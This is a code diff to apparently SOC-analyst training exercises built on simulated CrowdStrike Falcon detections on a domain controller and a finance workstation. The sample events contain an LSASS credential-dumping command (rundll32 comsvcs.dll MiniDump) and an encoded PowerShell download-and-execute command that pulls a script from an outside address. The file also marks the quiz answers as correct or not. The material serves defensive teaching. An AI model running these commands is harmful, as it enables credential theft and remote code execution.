@@ -356,13 +356,13 @@ After compromising one machine, attackers move to others. A common tool is **PsE
       id: "cs-falcon-la1",
       heading: "CrowdStrike Detection: Credential Dumping Alert",
       context:
-        "You are a SOC analyst on shift at 11:47 PM. A Critical severity alert fires in the CrowdStrike Falcon console. The alert is tagged with MITRE technique T1003.001 (OS Credential Dumping: LSASS Memory). The affected host is a domain controller: the most sensitive server in the organisation, as it holds all user credentials. Analyse the detection below and answer the questions.",
+        "You are a SOC analyst on shift at 11:47 PM. A Critical severity alert fires in the CrowdStrike Falcon console. The alert is tagged with MITRE technique T1003.001 (OS Credential Dumping: LSASS Memory). The affected host is a domain controller: the most sensitive server in the organisation, as it holds all user credentials. Below is the handle-operation record Falcon logged with this detection (event FalconProcessHandleOpDetectInfo, from the host's event search): it names the process that was opened and the access that was requested. Analyse it and answer the questions.",
       event: {
         id: "cs-evt-cred-dump-001",
         ts: "2025-06-14T23:47:12.000Z",
         source: "edr",
         vendor: "CrowdStrike Falcon",
-        event_type: "edr_alert",
+        event_type: "process_access",
         severity: "critical",
         hostname: "SRV-DC01",
         user_email: "svc-backup@corp.local",
@@ -380,32 +380,29 @@ After compromising one machine, attackers move to others. A common tool is **PsE
             "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\Windows\\Temp\\lsass.dmp full",
           user: "CORP\\svc-backup",
         },
+        // The detection's handle-operation record (FDR FalconProcessHandleOpDetectInfo): the Falcon event
+        // that names the opened process and the requested access mask. A DetectionSummaryEvent carries
+        // neither field (Elastic crowdstrike integration, falcon and fdr data streams).
         raw: {
-          "crowdstrike.event_simpleName": "DetectionSummaryEvent",
-          "crowdstrike.SeverityName": "Critical",
-          "crowdstrike.Tactic": "Credential Access",
-          "crowdstrike.Technique": "LSASS Memory",
-          "threat.technique.id": "T1003",
-          "threat.technique.subtechnique.id": "T1003.001",
-          "crowdstrike.FileName": "rundll32.exe",
-          "crowdstrike.ContextProcessId": "4812",
-          "crowdstrike.ParentBaseFileName": "cmd.exe",
-          "crowdstrike.ParentProcessId": "2048",
+          "crowdstrike.event_simpleName": "FalconProcessHandleOpDetectInfo",
+          "crowdstrike.event_platform": "Win",
+          "crowdstrike.aid": "3f8e2a91c4d74b6a9e1f0c5d2b7a8e14",
+          "crowdstrike.ComputerName": "SRV-DC01",
+          "crowdstrike.UserName": "CORP\\svc-backup",
+          "crowdstrike.ContextProcessId": "38654705669",
+          "crowdstrike.ImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\rundll32.exe",
           "crowdstrike.CommandLine":
             "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\Windows\\Temp\\lsass.dmp full",
-          "crowdstrike.TargetProcessImageFileName": "lsass.exe",
+          "crowdstrike.ParentProcessId": "38654702113",
+          "crowdstrike.ParentImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe",
+          "crowdstrike.TargetProcessImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe",
           "crowdstrike.DesiredAccess": "2097151",
-          "crowdstrike.UserName": "CORP\\svc-backup",
-          "crowdstrike.ComputerName": "SRV-DC01",
-          "crowdstrike.DetectId": "ldt:3f8e2a91c4d74b6a9e1f0c5d2b7a8e14:38654705669",
-          "crowdstrike.FalconHostLink":
-            "https://falcon.crowdstrike.com/activity/detections/detail/3f8e2a91c4d74b6a9e1f0c5d2b7a8e14/38654705669",
         },
       },
       questions: [
         {
           question:
-            "The field 'crowdstrike.DesiredAccess: 2097151' appears in the alert, Falcon writes the access mask in decimal, and 2097151 is 0x1FFFFF in hex. In Windows, access mask 0x1FFFFF means PROCESS_ALL_ACCESS: full control over the target process. Why is this value specifically suspicious when the target is lsass.exe?",
+            "The field 'crowdstrike.DesiredAccess: 2097151' appears in the record, Falcon writes the access mask in decimal, and 2097151 is 0x1FFFFF in hex. In Windows, access mask 0x1FFFFF means PROCESS_ALL_ACCESS: full control over the target process. Why is this value specifically suspicious when the target is lsass.exe?",
           options: [
             "LSASS enforces the firewall policy, so full access lets a tool turn network filtering off",
             "LSASS holds credential material in memory; full access lets a tool read hashes and tickets",
@@ -489,7 +486,7 @@ After compromising one machine, attackers move to others. A common tool is **PsE
         ts: "2025-09-17T11:42:08.000Z",
         source: "edr",
         vendor: "CrowdStrike Falcon",
-        event_type: "process_create",
+        event_type: "process_access",
         severity: "critical",
         hostname: "WKST-FINANCE07",
         user_email: "l.chen@corp.local",
@@ -507,24 +504,24 @@ After compromising one machine, attackers move to others. A common tool is **PsE
             "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYAMgAvAHEAMwAuAHAAcwAxACcAKQA=",
           user: "CORP\\l.chen",
         },
+        // FDR FalconProcessHandleOpDetectInfo: the handle-operation record behind the detection, the
+        // Falcon event that carries TargetProcessImageFileName and DesiredAccess (a DetectionSummaryEvent
+        // has neither).
         raw: {
-          "crowdstrike.event_simpleName": "DetectionSummaryEvent",
-          "crowdstrike.SeverityName": "Critical",
-          "crowdstrike.Tactic": "Stealth",
-          "crowdstrike.Technique": "Process Injection",
-          "threat.technique.id": "T1055",
-          "crowdstrike.FileName": "powershell.exe",
-          "crowdstrike.ContextProcessId": "6120",
+          "crowdstrike.event_simpleName": "FalconProcessHandleOpDetectInfo",
+          "crowdstrike.event_platform": "Win",
+          "crowdstrike.aid": "9c41e7b2a05d4f8e8b3a6d17e2f0c954",
+          "crowdstrike.ContextProcessId": "42949675113",
+          "crowdstrike.ImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
           "crowdstrike.CommandLine":
             "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYAMgAvAHEAMwAuAHAAcwAxACcAKQA=",
-          "crowdstrike.TargetProcessImageFileName": "explorer.exe",
+          "crowdstrike.TargetProcessImageFileName": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
           "crowdstrike.DesiredAccess": "2097151",
           "crowdstrike.UserName": "CORP\\l.chen",
           "crowdstrike.ComputerName": "WKST-FINANCE07",
-          "crowdstrike.ParentBaseFileName": "WINWORD.EXE",
-          "crowdstrike.ParentProcessId": "5560",
+          "crowdstrike.ParentImageFileName": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "crowdstrike.ParentProcessId": "42949671877",
           "crowdstrike.ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\l.chen\\Downloads\\Q3_Invoice_Reconciliation.docm\" /o \"\"",
-          "crowdstrike.DetectId": "ldt:9c41e7b2a05d4f8e8b3a6d17e2f0c954:42949675113",
         },
       } satisfies TelemetryEvent,
       correct_verdict: "true_positive",
